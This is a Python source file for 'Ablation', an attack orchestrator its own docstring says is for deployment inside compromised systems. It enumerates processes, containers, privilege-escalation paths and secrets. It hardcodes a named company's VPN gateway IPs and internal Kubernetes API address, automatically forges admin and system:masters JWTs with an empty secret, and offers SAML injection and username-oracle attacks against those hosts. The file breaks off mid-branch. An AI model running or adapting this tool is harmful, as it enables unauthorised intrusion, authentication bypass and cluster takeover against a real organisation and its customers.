#!/usr/bin/env python3
"""
Ablation - Autonomous Reverse Engineering Tool

Deploy inside compromised system to autonomously reverse engineer unknown platform.

Usage:
    ./ablation              - Full autonomous analysis
    ./ablation --quick      - Quick platform fingerprint only
    ./ablation --process PID - Analyze specific process
    ./ablation --binary FILE - Analyze specific binary
    ./ablation --syscalls PID [duration] - Trace syscalls for process
    ./ablation --privesc     - Enumerate privilege escalation paths
    ./ablation --docker      - Docker enumeration
    ./ablation --k8s         - Kubernetes enumeration
    ./ablation --orka        - Orka platform enumeration
    ./ablation --containers  - Full container analysis (Docker + K8s + Orka)
    ./ablation --asa [HOST]  - Cisco ASA WebVPN enumeration
    ./ablation --jwt FILE    - JWT/cryptographic weakness analysis
    ./ablation --harbor HOST - Harbor registry enumeration
    ./ablation --arm64 FILE  - ARM64 Mach-O deep analysis
    ./ablation --java PATH   - Java .class/.jar security audit
    ./ablation --swift PATH  - Swift Mach-O binary RE
"""

import sys
import json
from pathlib import Path

# Core modules
sys.path.insert(0, str(Path(__file__).parent / 'core'))
sys.path.insert(0, str(Path(__file__).parent / 'modules'))

from platform_detect import PlatformDetector
from binary_parser import BinaryParser
from disasm_engine import DisasmEngine
from process_enum import ProcessEnumerator
from syscall_trace import SyscallTracer
from privesc_enum import PrivescEnumerator
from network_analyze import NetworkAnalyzer
from docker_enum import DockerEnumerator
from k8s_enum import K8sEnumerator
from orka_enum import OrkaEnumerator

try:
    from swift_re import SwiftREAnalyzer
    HAS_SWIFT_RE = True
except ImportError:
    HAS_SWIFT_RE = False
    SwiftREAnalyzer = None

try:
    from arm64_analyzer import ARM64Analyzer, analyze_arm64_binary
    HAS_ARM64 = True
except ImportError:
    HAS_ARM64 = False
    ARM64Analyzer = None

try:
    from jwt_crypto_analyzer import (
        JWTCryptoAnalyzer, forge_token, find_jwts_in_file,
        MACSTADIUM_IDP, MACSTADIUM_FORGE_PAYLOADS,
    )
    HAS_CRYPTO_AUDIT = True
except ImportError:
    HAS_CRYPTO_AUDIT = False
    JWTCryptoAnalyzer = None

try:
    from asa_enum import ASAEnumerator, enumerate_macstadium_asas, MACSTADIUM_ASAS
    HAS_ASA_ENUM = True
except ImportError:
    HAS_ASA_ENUM = False
    ASAEnumerator = None

try:
    from harbor_enum import HarborEnumerator
    HAS_HARBOR = True
except ImportError:
    HAS_HARBOR = False
    HarborEnumerator = None

try:
    from java_re import JavaREAnalyzer
    HAS_JAVA_RE = True
except ImportError:
    HAS_JAVA_RE = False
    JavaREAnalyzer = None

try:
    from nxos_enum import NXOSEnumerator, enumerate_macstadium_cisco, MACSTADIUM_CISCO_TARGETS
    HAS_NXOS = True
except ImportError:
    HAS_NXOS = False
    NXOSEnumerator = None
    MACSTADIUM_CISCO_TARGETS = []

try:
    from cisco_asdm_download_re import ASDMDownloader, ASDMJarRE as ASDMJARAnalyzer
    HAS_ASDM_RE = True
except ImportError:
    HAS_ASDM_RE = False
    ASDMDownloader = None

try:
    from cisco_webvpn_js_re import WebVPNJSRE
    HAS_WEBVPN_JS = True
except ImportError:
    HAS_WEBVPN_JS = False
    WebVPNJSRE = None

try:
    from cisco_ios_re import CiscoIOSImage, analyze_ios_firmware
    HAS_IOS_RE = True
except ImportError:
    HAS_IOS_RE = False
    CiscoIOSImage = None

try:
    from cisco_rommon_re import ROMMONBypassRE
    HAS_ROMMON_RE = True
except ImportError:
    HAS_ROMMON_RE = False
    ROMMONBypassRE = None

try:
    from cisco_config_re import CiscoConfigRE
    HAS_CONFIG_RE = True
except ImportError:
    HAS_CONFIG_RE = False
    CiscoConfigRE = None

try:
    from cisco_api_enum import CiscoAPIEnum
    HAS_CISCO_API = True
except ImportError:
    HAS_CISCO_API = False
    CiscoAPIEnum = None

try:
    from cisco_nxos_guestshell_re import NXOSGuestshellRE
    HAS_GUESTSHELL = True
except ImportError:
    HAS_GUESTSHELL = False
    NXOSGuestshellRE = None

try:
    from cisco_cstp_attack import (
        HostScanGateRE, CSTPTunnelRE, ASDMJarClassRE, GoBinaryRE,
        SAMLSpInjectionRE, UsernameTimingOracleRE, TunnelGroupEnumRE, RADIUSClassAttrRE,
        analyze_asa_attack_surface, analyze_go_binary, analyze_java_class,
        analyze_saml_sp, analyze_username_oracle, analyze_tunnel_groups, analyze_radius_class_attr,
    )
    HAS_CSTP = True
except ImportError:
    HAS_CSTP = False
    HostScanGateRE = None
    CSTPTunnelRE = None
    GoBinaryRE = None
    SAMLSpInjectionRE = None
    UsernameTimingOracleRE = None
    TunnelGroupEnumRE = None
    RADIUSClassAttrRE = None

try:
    from orka_oidc_re import (
        run_full_re as orka_oidc_run,
        run_jwt_analysis as orka_jwt_analysis,
        forge_admin_token, forge_system_masters_token,
        get_binary_re_findings,
        probe_cluster_info, probe_k8s_api, probe_harbor_creds,
        probe_oidc_discovery,
        generate_pkce, generate_oidc_login_url,
        KNOWN_TOKEN,
    )
    HAS_ORKA_OIDC = True
except ImportError:
    HAS_ORKA_OIDC = False
    orka_oidc_run = None


MACSTADIUM_ASAS = [
    {'host': '207.254.35.12', 'port': 443, 'label': 'ASA-Primary'},
    {'host': '207.254.16.2',  'port': 443, 'label': 'ASA-Secondary'},
]


class Ablation:
    """Main reverse engineering orchestrator"""
    
    def __init__(self):
        self.platform = None
        self.processes = []
        self.binaries = []
        self.findings = {
            'platform': {},
            'processes': [],
            'binaries': [],
            'vulnerabilities': [],
            'interesting': [],
            'privesc_paths': [],
            'network': {},
            'docker': {},
            'kubernetes': {},
            'orka': {},
            'swift_re': {},
            'java_re': {},
            'crypto_audit': {},
            'asa': {},
            'nxos': {},
        }
        self.version = "2.4.0"
    
    def banner(self):
        """Display banner"""
        print(r"""
    ___    __    __    ___  ___________  ____  _  __
   / _ |  / /   / /   / _ |/_  __/  _/ |/ / | / /
  / __ | / _ \ / /__ / __ | / /  _/ //    /  |/ / 
 /_/ |_|/_.__//____//_/ |_|/_/ /___/_/|_/_/|___/  
                                                   
 Autonomous Reverse Engineering Tool v{}
 Deploy INSIDE systems | Zero dependencies
        """.format(self.version))
    
    def run_autonomous(self):
        """Full autonomous analysis"""
        self.banner()
        print("[*] Ablation - Autonomous Mode")
        print("[*] Analyzing compromised system...")
        print()
        
        # Step 1: Platform detection
        print("[1/8] Platform Detection")
        self.detect_platform()
        print(f"  OS: {self.findings['platform']['os']} {self.findings['platform']['arch_bits']}bit")
        print(f"  Kernel: {self.findings['platform'].get('kernel', 'N/A')}")
        print()
        
        # Step 2: Process enumeration
        print("[2/8] Process Enumeration")
        self.enumerate_processes()
        print(f"  Found {len(self.findings['processes'])} running processes")
        print()
        
        # Step 3: Binary discovery
        print("[3/8] Binary Discovery")
        self.discover_binaries()
        print(f"  Found {len(self.findings['binaries'])} interesting binaries")
        print()
        
        # Step 4: Network analysis
        print("[4/8] Network Analysis")
        self.analyze_network()
        print(f"  Interfaces: {len(self.findings['network'].get('interfaces', []))}")
        print(f"  Listening: {len(self.findings['network'].get('listening', []))}")
        print()
        
        # Step 5: Container/platform enumeration
        print("[5/8] Container/Platform Enumeration")
        self.enumerate_containers()
        docker_info = self.findings['docker']
        k8s_info = self.findings['kubernetes']
        orka_info = self.findings['orka']
        
        if docker_info.get('in_container') or docker_info.get('socket_access'):
            print(f"  Docker: In container={docker_info.get('in_container')}, Socket={docker_info.get('socket_access')}")
        if k8s_info.get('in_k8s'):
            print(f"  Kubernetes: Namespace={k8s_info.get('namespace')}")
        if orka_info.get('in_orka_vm') or orka_info.get('orka_api_reachable'):
            print(f"  Orka: VM={orka_info.get('in_orka_vm')}, API={orka_info.get('orka_api_reachable')}")
        print()
        
        # Step 6: Vulnerability hunting
        print("[6/8] Vulnerability Analysis")
        self.hunt_vulnerabilities()
        print(f"  Identified {len(self.findings['vulnerabilities'])} potential vulnerabilities")
        print()
        
        # Step 7: Privilege escalation paths
        print("[7/8] Privilege Escalation Enumeration")
        self.enumerate_privesc()
        print(f"  Found {len(self.findings['privesc_paths'])} potential paths")
        print()
        
        # Step 8: Swift binary RE (macOS/iOS targets)
        if self.findings['platform'].get('os') in ('Darwin', 'macOS') or \
           any('swift' in b.get('path', '').lower() or 'orka' in b.get('path', '').lower()
               for b in self.findings['binaries']):
            print("[8/11] Swift Binary Analysis")
            self.analyze_swift_binaries()
            sr = self.findings['swift_re']
            print(f"  Symbols: {sr.get('total_symbols', 0)}, SwiftNIO: {sr.get('swiftnio_detected', False)}, gRPC: {sr.get('grpc_detected', False)}")
            print()
        else:
            print("[8/11] Swift Analysis — skipped (non-Darwin)")
            print()

        # Step 9: Java/JVM RE
        print("[9/11] Java/JVM Analysis")
        self.analyze_java_artifacts()
        jr = self.findings['java_re']
        print(f"  Classes: {jr.get('total_classes', 0)}, Frameworks: {jr.get('frameworks', [])}")
        print()

        # Step 10: Cryptographic audit
        print("[10/11] Cryptographic Audit")
        self.audit_crypto()
        ca = self.findings['crypto_audit']
        jwt_count = len(ca.get('jwt_findings', []))
        key_count = len(ca.get('key_material', []))
        print(f"  JWTs found: {jwt_count}, Key material: {key_count}")
        if ca.get('critical_findings'):
            for cf in ca['critical_findings'][:3]:
                print(f"  [CRIT] {cf}")
        print()

        # Step 11: Generate report
        print("[11/11] Report Generation")
        report_path = self.generate_report()
        print(f"  Report saved: {report_path}")
        print()

        return self.findings
    
    def detect_platform(self):
        """Detect platform characteristics"""
        detector = PlatformDetector()
        detector.detect_all()
        self.findings['platform'] = detector.info
        self.platform = detector
        return detector.info
    
    def enumerate_processes(self):
        """Enumerate all running processes"""
        enum = ProcessEnumerator()
        procs = enum.list_all_processes()
        
        # Find interesting processes
        interesting_names = ['ssh', 'sshd', 'apache', 'nginx', 'mysql', 'postgres', 
                           'docker', 'kubelet', 'redis', 'mongo', 'sudo', 'su',
                           'containerd', 'dockerd', 'kube-proxy', 'orka']
        
        for proc in procs:
            entry = {
                'pid': proc['pid'],
                'name': proc['name'],
                'cmdline': proc['cmdline']
            }
            
            # Flag interesting ones
            if any(name in proc['name'].lower() for name in interesting_names):
                entry['interesting'] = True
                self.findings['interesting'].append({
                    'type': 'process',
                    'name': proc['name'],
                    'detail': f"PID {proc['pid']}"
                })
            
            self.findings['processes'].append(entry)
        
        return procs
    
    def discover_binaries(self):
        """Discover interesting binaries"""
        search_paths = [
            '/bin',
            '/sbin',
            '/usr/bin',
            '/usr/sbin',
            '/usr/local/bin',
            '/opt'
        ]
        
        interesting_binaries = []
        
        for path in search_paths:
            path_obj = Path(path)
            if not path_obj.exists():
                continue
            
            try:
                for binary in path_obj.iterdir():
                    if binary.is_file():
                        try:
                            parser = BinaryParser(binary)
                            info = parser.parse()
                            
                            entry = {
                                'path': str(binary),
                                'format': info['format'],
                                'bits': info.get('bits'),
                                'entry': info.get('entry_point')
                            }
                            
                            interesting_binaries.append(entry)
                            
                            if len(interesting_binaries) >= 50:
                                break
                        except:
                            pass
            except:
                pass
            
            if len(interesting_binaries) >= 50:
                break
        
        self.findings['binaries'] = interesting_binaries
        return interesting_binaries
    
    def analyze_network(self):
        """Analyze network configuration"""
        analyzer = NetworkAnalyzer()
        network_info = analyzer.enumerate_all()
        self.findings['network'] = network_info
        return network_info
    
    def enumerate_containers(self):
        """Enumerate Docker, Kubernetes, and Orka"""
        # Docker
        docker_enum = DockerEnumerator()
        self.findings['docker'] = docker_enum.enumerate_all()
        
        # Kubernetes
        k8s_enum = K8sEnumerator()
        self.findings['kubernetes'] = k8s_enum.enumerate_all()
        
        # Orka
        orka_enum = OrkaEnumerator()
        self.findings['orka'] = orka_enum.enumerate_all()
        
        return {
            'docker': self.findings['docker'],
            'kubernetes': self.findings['kubernetes'],
            'orka': self.findings['orka']
        }
    
    def hunt_vulnerabilities(self):
        """Hunt for common vulnerabilities"""
        vulns = []
        
        if self.findings['platform'].get('security'):
            sec = self.findings['platform']['security']
            
            # ASLR disabled
            if sec.get('aslr') == 'disabled':
                vulns.append({
                    'severity': 'HIGH',
                    'type': 'ASLR Disabled',
                    'description': 'Address Space Layout Randomization is disabled',
                    'impact': 'Easier exploitation of memory corruption bugs',
                    'remediation': 'Enable ASLR: echo 2 > /proc/sys/kernel/randomize_va_space'
                })
        
        # Check for ptrace availability
        if self.findings['platform'].get('capabilities', {}).get('ptrace_scope') == 0:
            vulns.append({
                'severity': 'MEDIUM',
                'type': 'Unrestricted ptrace',
                'description': 'ptrace is unrestricted (ptrace_scope=0)',
                'impact': 'Any process can debug any other process',
                'remediation': 'Restrict ptrace: echo 1 > /proc/sys/kernel/yama/ptrace_scope'
                })
        
        # Container escape vectors
        if self.findings['docker'].get('escape_vectors'):
            for vec in self.findings['docker']['escape_vectors']:
                vulns.append({
                    'severity': vec['severity'],
                    'type': f"Docker: {vec['type']}",
                    'description': vec['description'],
                    'impact': 'Container escape possible',
                    'remediation': vec.get('exploit', 'Review container configuration')
                })
        
        if self.findings['kubernetes'].get('escape_vectors'):
            for vec in self.findings['kubernetes']['escape_vectors']:
                vulns.append({
                    'severity': vec['severity'],
                    'type': f"K8s: {vec['type']}",
                    'description': vec['description'],
                    'impact': 'Pod escape possible',
                    'remediation': vec.get('exploit', 'Review pod security policy')
                })
        
        # Orka findings
        if self.findings['orka'].get('findings'):
            for finding in self.findings['orka']['findings']:
                vulns.append({
                    'severity': finding['severity'],
                    'type': f"Orka: {finding['type']}",
                    'description': finding['description'],
                    'impact': finding.get('exploit', 'Security exposure'),
                    'remediation': 'Review Orka security configuration'
                })
        
        self.findings['vulnerabilities'] = vulns
        return vulns
    
    def enumerate_privesc(self):
        """Enumerate privilege escalation paths"""
        enum = PrivescEnumerator()
        paths = enum.enumerate_all()
        self.findings['privesc_paths'] = paths
        return paths
    
    def analyze_swift_binaries(self):
        """Find and analyze Swift binaries on the system"""
        if not HAS_SWIFT_RE:
            self.findings['swift_re'] = {'error': 'swift_re module not available'}
            return

        analyzer = SwiftREAnalyzer()
        results = {
            'total_symbols': 0,
            'swiftnio_detected': False,
            'grpc_detected': False,
            'binaries': [],
            'interesting_strings': [],
            'findings': []
        }

        # Known interesting Swift binaries (Orka engine + any found in binaries list)
        swift_candidates = [
            '/usr/local/libexec/orka-engine.app/Contents/MacOS/com.macstadium.orka-engine.server',
        ]
        swift_candidates += [
            b['path'] for b in self.findings['binaries']
            if b.get('format') in ('macho', 'Mach-O')
        ]

        for path in swift_candidates[:5]:
            try:
                result = analyzer.analyze(path)
                results['total_symbols'] += result.get('swift_symbol_count', 0)
                grpc_svcs = result.get('grpc_services', [])
                results['swiftnio_detected'] = results['swiftnio_detected'] or any(
                    'NIO' in s.get('service_name', '') for s in grpc_svcs
                )
                results['grpc_detected'] = results['grpc_detected'] or bool(grpc_svcs)
                results['interesting_strings'].extend(result.get('security_strings', [])[:10])
                results['findings'].extend(result.get('findings', []))
                results['binaries'].append({'path': path, 'grpc_services': grpc_svcs,
                                            'vapor_routes': result.get('vapor_routes', []),
                                            'swift_sections': result.get('swift_sections', {})})
            except Exception as e:
                results['binaries'].append({'path': path, 'error': str(e)})

        self.findings['swift_re'] = results

    def analyze_java_artifacts(self):
        """Find and analyze Java class files and JARs"""
        if not HAS_JAVA_RE:
            self.findings['java_re'] = {'error': 'java_re module not available'}
            return

        analyzer = JavaREAnalyzer()
        paths = analyzer.scan_for_class_files()

        all_results = {
            'total_classes': 0,
            'frameworks': [],
            'dangerous_calls': [],
            'config_secrets': [],
            'findings': []
        }

        for path in paths[:10]:
            try:
                result = analyzer.analyze(path)
                all_results['total_classes'] += result.get('class_count', 0)
                all_results['frameworks'] = list(set(
                    all_results['frameworks'] + result.get('frameworks', [])
                ))
                all_results['dangerous_calls'].extend(result.get('dangerous_calls', []))
                all_results['config_secrets'].extend(result.get('config_secrets', []))
                all_results['findings'].extend(result.get('findings', []))
            except Exception:
                pass

        self.findings['java_re'] = all_results

    def audit_crypto(self):
        """Run cryptographic audit on the system — JWT/SAML/key material scan."""
        if not HAS_CRYPTO_AUDIT:
            self.findings['crypto_audit'] = {'error': 'jwt_crypto_analyzer module not available'}
            return

        auditor  = JWTCryptoAnalyzer()
        result   = {'jwt_findings': [], 'key_material': [], 'forged_tokens': []}
        critical = []

        # Scan interesting files for embedded JWTs
        scan_paths = [
            '/etc', '/var/log', '/tmp',
            str(Path.home() / '.kube'),
            str(Path.home() / '.config'),
        ]
        for sp in scan_paths:
            try:
                for p in Path(sp).rglob('*.json'):
                    fres = auditor.analyze_file(str(p))
                    if fres['tokens_found']:
                        result['jwt_findings'].append(fres)
                        for f in fres['findings']:
                            if f['severity'] == 'CRITICAL':
                                critical.append(f'{f["type"]}: {f["description"][:80]}')
            except Exception:
                pass

        # Pre-forge MacStadium admin tokens (empty secret confirmed)
        if HAS_CRYPTO_AUDIT:
            for payload in MACSTADIUM_FORGE_PAYLOADS:
                tok = forge_token(payload, secret=b'', alg='HS256')
                result['forged_tokens'].append({'payload': payload, 'token': tok})
                critical.append(f'FORGED_JWT(empty_secret): sub={payload["sub"]} → {tok[:40]}...')

        result['critical_findings'] = critical

        for vuln_str in critical:
            self.findings['vulnerabilities'].append({
                'severity':    'CRITICAL',
                'type':        'CryptoAudit',
                'description': vuln_str,
                'impact':      'Token forgery / auth bypass',
                'remediation': 'Rotate JWT secrets; enforce HS256 with >=256-bit random key',
            })

        self.findings['crypto_audit'] = result

    def enumerate_asa(self, targets=None):
        """Enumerate Cisco ASA VPN instances (MacStadium: 207.254.35.12, 207.254.16.2, 207.254.72.76)."""
        if not HAS_ASA_ENUM:
            self.findings['asa'] = {'error': 'asa_enum module not available'}
            return {}

        results = []
        hosts = targets or [cfg['host'] for cfg in MACSTADIUM_ASAS]

        for host in hosts:
            cfg  = next((c for c in MACSTADIUM_ASAS if c['host'] == host), {})
            enum = ASAEnumerator(host, name=cfg.get('name', host))
            if cfg.get('groups'):
                enum.groups = cfg['groups']
            r = enum.enumerate_all()
            r['cert_pin'] = cfg.get('cert_pin')
            results.append(r)

            # Fold ASA findings into main vuln list
            for finding in r.get('findings', []):
                if finding['severity'] in ('CRITICAL', 'HIGH'):
                    self.findings['vulnerabilities'].append({
                        'severity':    finding['severity'],
                        'type':        f'ASA: {finding["type"]}',
                        'description': finding['description'],
                        'impact':      finding.get('exploit', 'VPN/auth exposure'),
                        'remediation': 'Harden ASA WebVPN configuration',
                    })

        self.findings['asa'] = {'instances': results, 'count': len(results)}
        return self.findings['asa']

    def enumerate_nxos(self, targets=None):
        """Enumerate Cisco NX-OS, ACI/APIC, and VXLAN fabric (MacStadium 207.254.14.x)."""
        if not HAS_NXOS:
            self.findings['nxos'] = {'error': 'nxos_enum module not available'}
            return {}

        enum = NXOSEnumerator(targets=targets or MACSTADIUM_CISCO_TARGETS)
        result = enum.run()
        self.findings['nxos'] = result

        for finding in enum.findings:
            if finding.get('severity') in ('CRITICAL', 'HIGH'):
                self.findings['vulnerabilities'].append({
                    'severity':    finding['severity'],
                    'type':        f"NX-OS: {finding['type']}",
                    'description': f"{finding.get('host', '')} creds={finding.get('creds', '')}",
                    'impact':      'Full fabric control / tenant enumeration / VTEP discovery',
                    'remediation': 'Rotate credentials; disable Telnet; enforce TACACS+',
                })

        return result

    def analyze_process(self, pid):
        """Deep analysis of specific process"""
        enum = ProcessEnumerator(pid)
        
        report = {
            'pid': pid,
            'maps': enum.get_memory_maps(),
            'modules': enum.get_loaded_modules(),
            'fds': enum.get_open_files(),
            'env': enum.get_environment(),
            'wx_regions': enum.find_writable_executable()
        }
        
        return report
    
    def analyze_binary(self, filepath):
        """Deep analysis of specific binary"""
        parser = BinaryParser(filepath)
        info = parser.parse()
        
        # Disassemble entry point
        with open(filepath, 'rb') as f:
            if info.get('entry_point'):
                entry = int(info['entry_point'], 16)
                f.seek(entry if entry < 1000000 else 0)
                code = f.read(512)
                
                engine = DisasmEngine()
                disasm = engine.disassemble(code, entry, count=50)
                
                info['disassembly'] = disasm[:20]
        
        return info
    
    def trace_syscalls(self, pid, duration=5):
        """Trace syscalls for a process"""
        tracer = SyscallTracer(pid)
        return tracer.trace_process(duration)
    
    def generate_report(self):
        """Generate comprehensive report"""
        report_path = Path('/tmp/ablation-report.json')
        
        with open(report_path, 'w') as f:
            json.dump(self.findings, f, indent=2)
        
        # Text summary
        summary_path = Path('/tmp/ablation-summary.txt')
        with open(summary_path, 'w') as f:
            f.write("="*60 + "\n")
            f.write("ABLATION - AUTONOMOUS ANALYSIS REPORT\n")
            f.write("="*60 + "\n\n")
            
            f.write("PLATFORM\n")
            f.write("-"*60 + "\n")
            p = self.findings['platform']
            f.write(f"OS: {p.get('os')} {p.get('os_release', '')}\n")
            f.write(f"Architecture: {p.get('machine')} ({p.get('arch_bits')} bit)\n")
            if 'kernel' in p:
                f.write(f"Kernel: {p['kernel']}\n")
            f.write("\n")
            
            f.write("CONTAINERS/PLATFORMS\n")
            f.write("-"*60 + "\n")
            docker_info = self.findings['docker']
            k8s_info = self.findings['kubernetes']
            orka_info = self.findings['orka']
            f.write(f"Docker In Container: {docker_info.get('in_container', False)}\n")
            f.write(f"Docker Socket Access: {docker_info.get('socket_access', False)}\n")
            f.write(f"Kubernetes: {k8s_info.get('in_k8s', False)}\n")
            f.write(f"Orka VM: {orka_info.get('in_orka_vm', False)}\n")
            f.write(f"Orka API: {orka_info.get('orka_api_reachable', False)}\n")
            if orka_info.get('in_orka_vm'):
                f.write(f"  Metadata Server: {orka_info.get('metadata_server', {}).get('available', False)}\n")
            f.write("\n")
            
            f.write("NETWORK\n")
            f.write("-"*60 + "\n")
            net = self.findings['network']
            f.write(f"Interfaces: {len(net.get('interfaces', []))}\n")
            f.write(f"Listening Ports: {len(net.get('listening', []))}\n")
            f.write(f"Active Connections: {len(net.get('connections', []))}\n")
            f.write("\n")
            
            f.write("PROCESSES\n")
            f.write("-"*60 + "\n")
            f.write(f"Total: {len(self.findings['processes'])}\n")
            interesting_procs = [p for p in self.findings['processes'] if p.get('interesting')]
            if interesting_procs:
                f.write(f"Interesting: {len(interesting_procs)}\n")
                for p in interesting_procs[:10]:
                    f.write(f"  PID {p['pid']}: {p['name']}\n")
            f.write("\n")
            
            f.write("VULNERABILITIES\n")
            f.write("-"*60 + "\n")
            for vuln in self.findings['vulnerabilities']:
                f.write(f"[{vuln['severity']}] {vuln['type']}\n")
                f.write(f"  {vuln['description']}\n")
                f.write(f"  Impact: {vuln['impact']}\n")
                f.write("\n")
            
            f.write("PRIVILEGE ESCALATION PATHS\n")
            f.write("-"*60 + "\n")
            for path in self.findings['privesc_paths']:
                f.write(f"[{path['severity']}] {path['category']}\n")
                f.write(f"  {path['description']}\n")
                f.write("\n")

            # Swift RE
            sr = self.findings.get('swift_re', {})
            if sr and not sr.get('error'):
                f.write("SWIFT BINARY ANALYSIS\n")
                f.write("-"*60 + "\n")
                f.write(f"Total symbols: {sr.get('total_symbols', 0)}\n")
                f.write(f"SwiftNIO detected: {sr.get('swiftnio_detected', False)}\n")
                f.write(f"gRPC detected: {sr.get('grpc_detected', False)}\n")
                for finding in sr.get('findings', [])[:10]:
                    f.write(f"  {finding}\n")
                f.write("\n")

            # Java RE
            jr = self.findings.get('java_re', {})
            if jr and not jr.get('error') and jr.get('total_classes', 0) > 0:
                f.write("JAVA/JVM ANALYSIS\n")
                f.write("-"*60 + "\n")
                f.write(f"Total classes: {jr.get('total_classes', 0)}\n")
                f.write(f"Frameworks: {', '.join(jr.get('frameworks', []))}\n")
                for dc in jr.get('dangerous_calls', [])[:5]:
                    f.write(f"  [DANGEROUS] {dc.get('method', dc)}\n")
                for sec in jr.get('config_secrets', [])[:5]:
                    f.write(f"  [SECRET] {sec.get('key', '?')} in {sec.get('path', '?')}\n")
                f.write("\n")

            # Crypto audit
            ca = self.findings.get('crypto_audit', {})
            if ca and not ca.get('error'):
                f.write("CRYPTOGRAPHIC AUDIT\n")
                f.write("-"*60 + "\n")
                for cf in ca.get('critical_findings', []):
                    f.write(f"  [CRITICAL] {cf}\n")
                for km in ca.get('key_material', [])[:5]:
                    f.write(f"  [KEY] {km.get('type', '?')} at {km.get('path', '?')}\n")
                jwt_list = ca.get('jwt_findings', [])
                if jwt_list:
                    f.write(f"  JWTs analyzed: {len(jwt_list)}\n")
                f.write("\n")

        return summary_path

def main():
    import argparse
    
    parser = argparse.ArgumentParser(description='Ablation - Autonomous Reverse Engineering')
    parser.add_argument('--quick', action='store_true', help='Quick platform fingerprint only')
    parser.add_argument('--process', type=int, metavar='PID', help='Analyze specific process')
    parser.add_argument('--binary', metavar='FILE', help='Analyze specific binary')
    parser.add_argument('--syscalls', type=int, metavar='PID', help='Trace syscalls for PID')
    parser.add_argument('--duration', type=int, default=5, help='Syscall trace duration (seconds)')
    parser.add_argument('--privesc', action='store_true', help='Enumerate privilege escalation paths')
    parser.add_argument('--docker', action='store_true', help='Docker enumeration')
    parser.add_argument('--k8s', action='store_true', help='Kubernetes enumeration')
    parser.add_argument('--orka', action='store_true', help='Orka platform enumeration')
    parser.add_argument('--containers', action='store_true', help='Full container/platform analysis')
    parser.add_argument('--swift', metavar='BINARY', help='Swift binary RE analysis')
    parser.add_argument('--java', metavar='PATH', help='Java class/JAR analysis')
    parser.add_argument('--crypto', action='store_true', help='Cryptographic audit (JWTs, keys, TLS)')
    parser.add_argument('--asa', action='store_true', help='Cisco ASA WebVPN enumeration')
    parser.add_argument('--jwt', metavar='TOKEN', help='Analyze JWT token for weaknesses')
    parser.add_argument('--nxos', action='store_true', help='Cisco NX-OS / ACI / APIC enumeration')
    parser.add_argument('--asdm-re', metavar='HOST', help='Download + RE Cisco ASDM JAR from live ASA')
    parser.add_argument('--webvpn-js', metavar='HOST', help='RE Cisco ASA WebVPN portal JavaScript')
    parser.add_argument('--ios-re', metavar='FILE', help='RE Cisco IOS/IOS-XE firmware image')
    parser.add_argument('--config-re', metavar='FILE', help='RE Cisco running-config for creds/topology')
    parser.add_argument('--rommon-re', metavar='CONFREG', help='ROMMON bypass analysis (hex config-register, e.g. 0x2102)')
    parser.add_argument('--cisco-api', metavar='HOST', help='Cisco API surface RE (RESTCONF/NETCONF/YANG)')
    parser.add_argument('--guestshell', metavar='HOST', help='NX-OS guestshell RE and escape analysis')
    parser.add_argument('--asdm-re-all', action='store_true', help='ASDM RE against all MacStadium ASAs')
    parser.add_argument('--webvpn-js-all', action='store_true', help='WebVPN JS RE against all MacStadium ASAs')
    parser.add_argument('--cstp', metavar='HOST', help='CSTP/HostScan/DAP attack surface RE')
    parser.add_argument('--cstp-all', action='store_true', help='CSTP RE against all MacStadium ASAs')
    parser.add_argument('--go-re', metavar='BINARY', help='Go binary static RE (module graph, endpoints, creds)')
    parser.add_argument('--saml-sp', metavar='HOST', help='SAML SP injection RE against ASA WebVPN')
    parser.add_argument('--saml-sp-all', action='store_true', help='SAML SP injection against all MacStadium ASAs')
    parser.add_argument('--username-oracle', metavar='HOST', help='Username timing oracle via POST /+webvpn+/index.html')
    parser.add_argument('--username-oracle-all', action='store_true', help='Username oracle against all MacStadium ASAs')
    parser.add_argument('--tunnel-groups', metavar='HOST', help='Enumerate tunnel groups / connection profiles')
    parser.add_argument('--tunnel-groups-all', action='store_true', help='Tunnel group enum against all MacStadium ASAs')
    parser.add_argument('--radius-re', metavar='HOST', help='RADIUS class attr 25 attack surface RE')
    parser.add_argument('--radius-re-all', action='store_true', help='RADIUS class attr RE against all MacStadium ASAs')
    parser.add_argument('--orka-oidc', action='store_true', help='Orka3 OIDC flow RE + JWT forge (CVE-2020-26160, empty secret)')
    parser.add_argument('--orka-jwt', action='store_true', help='Analyze + forge MacStadium JWT (HS256 empty-secret)')
    parser.add_argument('--orka-binary-re', action='store_true', help='Print orka3 binary RE findings summary')
    parser.add_argument('--forge-admin', action='store_true', help='Forge admin@macstadium.com JWT token')
    parser.add_argument('--forge-masters', action='store_true', help='Forge system:masters JWT for K8s cluster-admin')
    parser.add_argument('--orka-k8s', metavar='PATH', default='/api/v1/namespaces', help='Probe K8s API at 10.221.188.19:6443 with forged token')
    parser.add_argument('--oidc-discovery', action='store_true', help='Probe idp.macstadium.com OIDC discovery paths')

    args = parser.parse_args()
    
    ablation = Ablation()
    
    if args.quick:
        ablation.banner()
        info = ablation.detect_platform()
        print(ablation.platform.report())
    
    elif args.process:
        ablation.banner()
        report = ablation.analyze_process(args.process)
        print(json.dumps(report, indent=2))
    
    elif args.binary:
        ablation.banner()
        info = ablation.analyze_binary(args.binary)
        print(json.dumps(info, indent=2))
    
    elif args.syscalls:
        ablation.banner()
        print(f"[*] Tracing syscalls for PID {args.syscalls} ({args.duration}s)...")
        tracer = SyscallTracer(args.syscalls)
        stats = tracer.trace_process(args.duration)
        print("\n" + tracer.report(stats))
    
    elif args.privesc:
        ablation.banner()
        print("[*] Enumerating privilege escalation paths...")
        enum = PrivescEnumerator()
        paths = enum.enumerate_all()
        print(enum.report())
    
    elif args.docker:
        ablation.banner()
        print("[*] Enumerating Docker environment...")
        docker_enum = DockerEnumerator()
        docker_enum.enumerate_all()
        print(docker_enum.report())
    
    elif args.k8s:
        ablation.banner()
        print("[*] Enumerating Kubernetes environment...")
        k8s_enum = K8sEnumerator()
        k8s_enum.enumerate_all()
        print(k8s_enum.report())
    
    elif args.orka:
        ablation.banner()
        print("[*] Enumerating Orka platform...")
        orka_enum = OrkaEnumerator()
        orka_enum.enumerate_all()
        print(orka_enum.report())
    
    elif args.swift:
        ablation.banner()
        if not HAS_SWIFT_RE:
            print("[-] swift_re module not available")
        else:
            analyzer = SwiftREAnalyzer()
            result = analyzer.analyze(args.swift)
            print(json.dumps(result, indent=2))

    elif args.java:
        ablation.banner()
        if not HAS_JAVA_RE:
            print("[-] java_decompiler module not available")
        else:
            analyzer = JavaREAnalyzer(args.java)
            result = analyzer.analyze()
            print(json.dumps(result, indent=2))

    elif args.crypto:
        ablation.banner()
